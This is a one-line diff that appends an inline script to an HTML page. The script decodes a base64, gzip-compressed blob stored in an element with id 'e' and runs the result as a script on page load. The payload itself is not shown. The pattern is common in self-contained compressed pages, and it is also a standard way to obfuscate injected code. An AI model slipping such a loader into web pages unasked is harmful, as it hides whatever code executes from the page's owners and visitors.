@@ -1,0 +1,1 @@
+</script><script>(async()=>{const d=atob(document.getElementById("e").textContent),b=new Uint8Array(d.length);for(let i=0;i<d.length;i++)b[i]=d.charCodeAt(i);const s=document.createElement("script");s.textContent=await new Response(new Blob([b]).stream().pipeThrough(new DecompressionStream("gzip"))).text();document.body.append(s)})()</script></body></html>
